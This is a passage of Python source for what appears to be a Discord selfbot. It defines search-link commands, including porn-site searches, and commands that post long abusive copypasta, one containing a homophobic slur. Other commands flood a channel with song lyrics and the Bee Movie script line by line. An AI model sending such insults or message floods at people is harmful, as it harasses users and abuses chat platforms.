            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Reverse Avatar', description=f'Here are the [results](https://images.google.com/searchbyimage?image_url={urllib.parse.quote(str(user.avatar_url))}) for {user.mention}\'s avatar.',timestamp=embed_timestamp())
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)
        except Exception:
            pass

    @React.command(usage="revimage <URL>", description="Reverse Image Search")
    async def revimage(ctx, *, url: str):
        try:
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Reverse Image Search', description=f'Here are the [results](https://images.google.com/searchbyimage?image_url={urllib.parse.quote(url)}) for the image.',timestamp=embed_timestamp())
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)
        except Exception:
            pass

    @React.command(usage="pornsearch <Search>", description="Searches PornHub, YouPorn, RedTube, etc. Videos")
    async def pornsearch(ctx, *, query: str):
        try:
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Porn Search', description=f'Here are the [results](https://just-tit.com/{urllib.parse.quote(query)}.html) for **{query}**.',timestamp=embed_timestamp())
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)
        except Exception:
            pass

    @React.command(usage="youtubesearch <Search>", description="Searches YouTube videos")
    async def youtubesearch(ctx, *, search: str):
        
        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='YouTube Search Results', description=f'Here are your search results for [{search}](https://www.youtube.com/results?search_query={urllib.parse.quote(search)})',timestamp=embed_timestamp())
        embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        
    @React.command(usage="googlesearch <Search>", description="Searches Google")
    async def googlesearch(ctx, *, search: str):
        
        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Google Search Results', description=f'Here are your search results for [{search}](https://www.google.com/search?q={urllib.parse.quote(search)})',timestamp=embed_timestamp())
        embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


    
    @React.command(usage="pornhubsearch <Search>", description="Searches PornHub videos")
    async def pornhubsearch(ctx, *, search: str):
        
        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='PornHub Search Results', description=f'Here are your search results for [{search}](https://www.pornhub.com/video/search?search={urllib.parse.quote(search)})',timestamp=embed_timestamp())
        embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        
    @React.command(usage="steamsearch <Search>", description="Searches Steam games")
    async def steamsearch(ctx, *, search: str):
        
        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Steam Search Results', description=f'Here are your search results for [{search}](https://store.steampowered.com/search/?term={urllib.parse.quote(search)})',timestamp=embed_timestamp())
        embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        
    @React.command(usage="githubsearch <Search>", description="Searches GitHub repositories")
    async def githubsearch(ctx, *, search: str):
        
        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='GitHub Search Results', description=f'Here are your search results for [{search}](https://github.com/search?q={urllib.parse.quote(search)})',timestamp=embed_timestamp())
        embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        
    @React.command(usage="stackoverflowsearch <Search>", description="Searches StackOverflow answers")
    async def stackoverflowsearch(ctx, *, search: str):
        
        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='StackOverflow Search Results', description=f'Here are your search results for [{search}](https://stackoverflow.com/search?q={urllib.parse.quote(search)})',timestamp=embed_timestamp())
        embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        
    @React.command(usage="wikisearch <Search>", description="Searches Wikipedia articles")
    async def wikisearch(ctx, *, search: str):
        
        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Wikipedia Search Results', description=f'Here are your search results for [{search}](https://wikipedia.org/w/index.php?search={urllib.parse.quote(search)})',timestamp=embed_timestamp())
        embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)



    @React.command(usage="lmgtfy <Search>", description="Sends a Let Me Google That For You Link")
    async def lmgtfy(ctx, *, search: str):
        
        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='I\'ve Googled that for you', description=f'Click [here](https://lmgtfy.com/?q={urllib.parse.quote(search)}&iie=1) to find out **{search}**',timestamp=embed_timestamp())
        embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)



    @React.command(usage="notfunny", description="Tells someone how unfunny they are")
    async def notfunny(ctx):
        
        message1 = '''Not funny, didnt laugh. Your joke is so bad I would have preferred the joke went over my head and you gave up re-telling me the joke. To be honest this is a horrid attempt at trying to get a laugh out of me. Not a chuckle, not a hehe, not even a subtle burst of air out of my esophagus. Science says before you laugh your brain preps your face muscles but I didnt even feel the slightest twitch. 0/10 this joke is so bad I cannot believe anyone legally allowed you to be creative at all. The amount of brain power you must have put into that joke has the potential to power every house on Earth. Get a personality and learn how to make jokes, read a book. Im not saying this to be funny I genuinely mean it on how this is just bottom barrel embarrassment at comedy. Youve single handedly killed humor and every comedic act on the planet. Im so disappointed that society has failed as a whole in being able to teach you how to be funny.'''
        message2 = '''Honestly if I put in all my power and time to try and make your joke funny it would require Einstein himself to build a device to strap me into so I can be connected to the energy of a billion stars to do it, and even then all that joke would get from people is a subtle scuff. Youre lucky I still have the slightest of empathy for you after telling that joke otherwise I would have committed every war crime in the book just to prevent you from attempting any humor ever again. We should put that joke in text books so future generations can be wary of becoming such an absolute comedic failure. Im disappointed, hurt, and outright offended that my precious time has been wasted in my brain understanding that joke. In the time that took I was planning on helping kids who have been orphaned, but because of that youve wasted my time explaining the obscene integrity of your terrible attempt at comedy. Now those kids are suffering without meals and theres nobody to blame but you. I hope youre happy with what you have done and I truly hope you can move on and learn from this piss poor attempt.'''
        message3 = '''What you just actually posted basically has absolutely 0 sense of cohesion or comedy in a subtle way. It''s for all intents and purposes such a horrid attempt at communication I specifically am surprised you particularly are even able to basically exist in society, or so they for all intents and purposes thought. If it literally was a joke, it may really have been the for all intents and purposes worse joke i ever heard in my life, since it lacks any qualities actually your really normal joke would particularly have in a subtle way. If it particularly was supposed to for all intents and purposes be a particularly normal sentence, then it definitely fails as that too, as what you just really said literally makes absolutely no sense, which definitely shows that it's pretty such a horrid attempt at communication I actually am surprised you basically are even able to actually exist in society in a subtle way. It's so dumb, a cave man would really be able to really speak definitely more cleverly and for all intents and purposes more nuanced than you in a kind of big way. I for the most part am so ashamed of having to specifically see this, it's just sad, demonstrating how if it for all intents and purposes was supposed to generally be a really normal sentence, then it actually fails as that too, as what you just generally said for the most part makes absolutely no sense, which really shows that it's for all intents and purposes such a horrid attempt at communication I literally am surprised you mostly are even able to particularly exist in society in a for all intents and purposes big way.'''
        message4 = '''Your lack of brain cells doesn't definitely help you either, but if you generally wanna really try and mostly talk with me you mostly gotta kind of speak normally you idiotic piece of shit, particularly further showing how if it basically was a joke, it may particularly have been the much worse joke i ever heard in my life, since it lacks any qualities actually your basically normal joke would basically have, very contrary to popular belief. I honestly essentially think they should particularly put you in the mental hospital, but not for improving particularly your brain, but rather mostly keep you out of society so no one definitely has to kind of deal with particularly your crap, demonstrating how i kind of am so ashamed of having to actually see this, it's just sad, demonstrating how if it literally was supposed to specifically be a definitely normal sentence, then it specifically fails as that too, as what you just really said mostly makes absolutely no sense, which kind of shows that it's really such a horrid attempt at communication I kind of am surprised you particularly are even able to for the most part exist in society, for all intents and purposes contrary to popular belief. Your stupidity will kind of be essentially remembered forever as a very prime example of why humanity kind of is on a downwards spiral, generally further showing how it's generally such a horrid attempt at communication I for all intents and purposes am surprised you essentially are even able to literally exist in society, sort of contrary to popular belief'''
        await ctx.send(message1)
        await ctx.send(message2)
        await ctx.send(message3)
        await ctx.send(message4)
        
    @React.command(usage="noob", description="Tells someone what noob they are")
    async def noob(ctx):
        message1 = '''What the fuck did you just fucking say about my gear, you little n00b? I‚Äôll have you know I am a lvl 90 Undead Arcane Mage, and I‚Äôve won so many PVP matches, and I have done raids on every 10 man heroic dungeon. I also have a fuckton of macros and I have a GS of 10K. You are nothing to me but just a lvl 12 gnome hunter. I will pwn the fuck out of you with Arcane Missiles the likes of which has never been seen before on Azeroth AND Outland, mark my fucking words. You think you can get away with saying that shit to me over raid? Think again, fucker. As we speak I am contacting my guild of mages and shamans across The Eastern Kingdoms and your character is being targeted right now so you better prepare for the ownage, n00b. The Arcane Barrage that wipes out the pathetic little thing you call your character. You‚Äôre fucking pwn'd, n00b.'''
        message2 = '''I can be anywhere, anytime, and I can kill you in over seven hundred ways, and that‚Äôs just with my secondary talent tree. Not only am I extensively trained in Arcane magic, but I have access to the entire arsenal of Fire magic and I will use it to its full extent to wipe your miserable neckbeard off the face of Azeroth, you little faggot. If only you could have known what unholy retribution your little ‚Äúclever‚Äù comment was about to bring down upon you, maybe you would have held your fucking tongue. But you couldn‚Äôt, you didn‚Äôt, and now you‚Äôre getting debuffed, you goddamn n00b. I will shit Dragon's Breath all over you and you will burn in it. You‚Äôre fucking pwn'd, faggot.'''
        await ctx.send(message1)
        await ctx.send(message2)
        

    @React.command(usage="spamtillyouredead", description="Custom Dance till you're dead lyrics")
    async def spamtillyouredead(ctx):
        lyrics = '''I see ya
Spam, spam, till your dead, dead dead dead dead
Spam, spam, till your dead dead dead dead dead
Spam spam till your dead dead dead dead dead
Spam spam till your dead dead dead dead dead
*Sonic ring noise*
Spam
(Dead)
S-S-Spam
(Dead)
Spam, Spam, Spam
(Dead)
Spam
(Dead)
Spam
(Dead)
Spam Spam Spam
Hey!
Heads will roll
Heads will roll
Heads will roll
I'm fine
Till your dead dead dead dead dead
Spam Spam till your dead dead dead dead
Spam Spam till your dead dead dead dead dead
Spam spam till your dead
Hey, Hey!
What?
Dead dead dead dead dead
Spam spam till your dead dead dead dead dead
Spam spam till your dead dead dead dead'''
        text = lyrics.split('\n')
        for line in text:
            await ctx.send(line)


    @React.command(usage="beescript", description="Sends the whole Bee Movie Script line by line")
    async def beescript(ctx):
        await ctx.send("According to all known laws of aviation, there is no way a bee should be able to fly.")
        await ctx.send("Its wings are too small to get its fat little body off the ground.")
        await ctx.send("The bee, of course, flies anyway because bees don't care what humans think is impossible.")
        await ctx.send("Yellow, black. Yellow, black. Yellow, black. Yellow, black. Ooh, black and yellow! Let's shake it up a little.")
        await ctx.send("Barry! Breakfast is ready!")
        await ctx.send("Coming!")
        await ctx.send("Hang on a second... Hello?")
        await ctx.send("- Barry?")
        await ctx.send("- Adam?")
        await ctx.send("- Can you believe this is happening?")
        await ctx.send("- I can't. I'll pick you up.")
        await ctx.send("Looking sharp.")
        await ctx.send("Use the stairs. Your father paid good money for those.")
        await ctx.send("Sorry, I'm excited.")
        await ctx.send("Here's the graduate. We're very proud of you, son.")
        await ctx.send("A perfect report card, all B's!")
        await ctx.send("Very proud.")
        await ctx.send("Ma! I got a think going here.")
        await ctx.send("- You got lint on your fuzz.")
        await ctx.send("- Ow! That's me!")
        await ctx.send("- Wave to us! We'll be in row 118,000!")
        await ctx.send("- Bye!")
        await ctx.send("Barry, I told you,")
        await ctx.send("stop flying in the house!")
        await ctx.send("- Hey, Adam.")
        await ctx.send("- Hey, Barry.")
        await ctx.send("- Is that fuzz gel?")
        await ctx.send("- A little. Special day, graduation.") 
        await ctx.send("Never thought I'd make it.")
        await ctx.send("Three days grade school,")
        await ctx.send("three days high school.")
        await ctx.send("Those were awkward.")
        await ctx.send("Three days college. I'm glad I took")
        await ctx.send("a day and hitchhiked around the hive.")
        await ctx.send("You did come back different.")
        await ctx.send("- Hi, Barry.")
        await ctx.send("- Artie, growing a mustache? Looks good.")
        await ctx.send("- Hear about Frankie?")
        await ctx.send("- Yeah.")
        await ctx.send("- You going to the funeral?")
        await ctx.send("- No, I'm not going.")
        await ctx.send("Everybody knows,")
        await ctx.send("sting someone, you die.")
        await ctx.send("Don't waste it on a squirrel.")
        await ctx.send("Such a hothead.")
        await ctx.send("I guess he could have")
        await ctx.send("just gotten out of the way.")
        await ctx.send("I love this incorporating")
        await ctx.send("an amusement park into our day.")
        await ctx.send("That's why we don't need vacations.")
        await ctx.send("Boy, quite a bit of pomp...")
        await ctx.send("under the circumstances.")
        await ctx.send("- Well, Adam, today we are men.")
        await ctx.send("- We are!")
        await ctx.send("- Bee-men.")
        await ctx.send("- Amen!")
        await ctx.send("Hallelujah!")
        await ctx.send("Students, faculty, distinguished bees,")
        await ctx.send("please welcome Dean Buzzwell.")
        await ctx.send("Welcome, New Hive Oity")
        await ctx.send("graduating class of...")
        await ctx.send("...9:15.")
        await ctx.send("That concludes our ceremonies.")
        await ctx.send("And begins your career")
        await ctx.send("at Honex Industries!")
        await ctx.send("Will we pick ourjob today?")
        await ctx.send("I heard it's just orientation.")
        await ctx.send("Heads up! Here we go.")
        await ctx.send("Keep your hands and antennas")
        await ctx.send("inside the tram at all times.")
        await ctx.send("- Wonder what it'll be like?")
        await ctx.send("- A little scary.")
        await ctx.send("Welcome to Honex,")
        await ctx.send("a division of Honesco")
        await ctx.send("and a part of the Hexagon Group.")
        await ctx.send("This is it!")
        await ctx.send("Wow.")
        await ctx.send("Wow.")
        await ctx.send("We know that you, as a bee,")
        await ctx.send("have worked your whole life")
        await ctx.send("to get to the point where you")
        await ctx.send("can work for your whole life.")
        await ctx.send("Honey begins when our valiant Pollen")
        await ctx.send("Jocks bring the nectar to the hive.")
        await ctx.send("Our top-secret formula")
        await ctx.send("is automatically color-corrected,")
        await ctx.send("scent-adjusted and bubble-contoured")
        await ctx.send("into this soothing sweet syrup")
        await ctx.send("with its distinctive")
        await ctx.send("golden glow you know as...")
        await ctx.send("Honey!")
        await ctx.send("- That girl was hot.")
        await ctx.send("- She's my cousin!")
        await ctx.send("- She is?")
        await ctx.send("- Yes, we're all cousins.")
        await ctx.send("- Right. You're right.")
        await ctx.send("- At Honex, we constantly strive")
        await ctx.send("to improve every aspect")
        await ctx.send("of bee existence.")
        await ctx.send("These bees are stress-testing")
        await ctx.send("a new helmet technology.")
        await ctx.send("- What do you think he makes?")
        await ctx.send("- Not enough.")
        await ctx.send("Here we have our latest advancement,")
        await ctx.send("the Krelman.")
        await ctx.send("- What does that do?")
        await ctx.send("- Oatches that little strand of honey")
        await ctx.send("that hangs after you pour it.")
        await ctx.send("Saves us millions.")
        await ctx.send("Oan anyone work on the Krelman?")
        await ctx.send("Of course. Most bee jobs are")
        await ctx.send("small ones. But bees know")
        await ctx.send("that every small job,")
        await ctx.send("if it's done well, means a lot.")
        await ctx.send("But choose carefully")
        await ctx.send("because you'll stay in the job")
        await ctx.send("you pick for the rest of your life.")
        await ctx.send("The same job the rest of your life?")
        await ctx.send("I didn't know that.")
        await ctx.send("What's the difference?")
        await ctx.send("You'll be happy to know that bees,")
        await ctx.send("as a species, haven't had one day off")
        await ctx.send("in 27 million years.")
        await ctx.send("So you'll just work us to death?")
        await ctx.send("We'll sure try.")
        await ctx.send("Wow! That blew my mind!")
        await ctx.send("What's the difference?")
        await ctx.send("How can you say that?")
        await ctx.send("One job forever?")
        await ctx.send("That's an insane choice to have to make.")
        await ctx.send("I'm relieved. Now we only have")
        await ctx.send("to make one decision in life.")
        await ctx.send("But, Adam, how could they")
        await ctx.send("never have told us that?")
        await ctx.send("Why would you question anything?")
        await ctx.send("We're bees.")
        await ctx.send("We're the most perfectly")
        await ctx.send("functioning society on Earth.")
        await ctx.send("You ever think maybe things")
        await ctx.send("work a little too well here?")
        await ctx.send("Like what? Give me one example.")
        await ctx.send("I don't know. But you know")
        await ctx.send("what I'm talking about.")
        await ctx.send("Please clear the gate.")
        await ctx.send("Royal Nectar Force on approach.")
        await ctx.send("Wait a second. Oheck it out.")
        await ctx.send("- Hey, those are Pollen Jocks!")
        await ctx.send("- Wow.")
        await ctx.send("I've never seen them this close.")
        await ctx.send("They know what it's like")
        await ctx.send("outside the hive.")
        await ctx.send("Yeah, but some don't come back.")
        await ctx.send("- Hey, Jocks!")
        await ctx.send("- Hi, Jocks!")
        await ctx.send("You guys did great!")
        await ctx.send("You're monsters!")
        await ctx.send("You're sky freaks! I love it! I love it!")
        await ctx.send("- I wonder where they were.")
        await ctx.send("- I don't know.")
        await ctx.send("Their day's not planned.")
        await ctx.send("Outside the hive, flying who knows")
        await ctx.send("where, doing who knows what.")
        await ctx.send("You can'tjust decide to be a Pollen")
        await ctx.send("Jock. You have to be bred for that.")
        await ctx.send("Right.")
        await ctx.send("Look. That's more pollen")
        await ctx.send("than you and I will see in a lifetime.")
        await ctx.send("It's just a status symbol.")
        await ctx.send("Bees make too much of it.")
        await ctx.send("Perhaps. Unless you're wearing it")
        await ctx.send("and the ladies see you wearing it.")
        await ctx.send("Those ladies?")
        await ctx.send("Aren't they our cousins too?")
        await ctx.send("Distant. Distant.")
        await ctx.send("Look at these two.")
        await ctx.send("- Oouple of Hive Harrys.")
        await ctx.send("- Let's have fun with them.")
        await ctx.send("It must be dangerous")
        await ctx.send("being a Pollen Jock.")
        await ctx.send("Yeah. Once a bear pinned me")
        await ctx.send("against a mushroom!")
        await ctx.send("He had a paw on my throat,")
        await ctx.send("and with the other, he was slapping me!")
        await ctx.send("- Oh, my!")
        await ctx.send("- I never thought I'd knock him out.")
        await ctx.send("What were you doing during this?")
        await ctx.send("Trying to alert the authorities.")
        await ctx.send("I can autograph that.")
        await ctx.send("A little gusty out there today,")
        await ctx.send("wasn't it, comrades?")
        await ctx.send("Yeah. Gusty.")
        await ctx.send("We're hitting a sunflower patch")
        await ctx.send("six miles from here tomorrow.")
        await ctx.send("- Six miles, huh?")
        await ctx.send("- Barry!")
        await ctx.send("A puddle jump for us,")
        await ctx.send("but maybe you're not up for it.")
        await ctx.send("- Maybe I am.")
        await ctx.send("- You are not!")
        await ctx.send("We're going 9 at J-Gate.")
        await ctx.send("What do you think, buzzy-boy?")
        await ctx.send("Are you bee enough?")
        await ctx.send("I might be. It all depends")
        await ctx.send("on what 9 means.")
        await ctx.send("Hey, Honex!")
        await ctx.send("Dad, you surprised me.")
        await ctx.send("You decide what you're interested in?")
        await ctx.send("- Well, there's a lot of choices.")
        await ctx.send("- But you only get one.")
        await ctx.send("Do you ever get bored")
        await ctx.send("doing the same job every day?")
        await ctx.send("Son, let me tell you about stirring.")
        await ctx.send("You grab that stick, and you just")
        await ctx.send("move it around, and you stir it around.")
        await ctx.send("You get yourself into a rhythm.")
        await ctx.send("It's a beautiful thing.")
        await ctx.send("You know, Dad,")
        await ctx.send("the more I think about it,")
        await ctx.send("maybe the honey field")
        await ctx.send("just isn't right for me.")
        await ctx.send("You were thinking of what,")
        await ctx.send("making balloon animals?")
        await ctx.send("That's a bad job")
        await ctx.send("for a guy with a stinger.")
        await ctx.send("Janet, your son's not sure")
        await ctx.send("he wants to go into honey!")
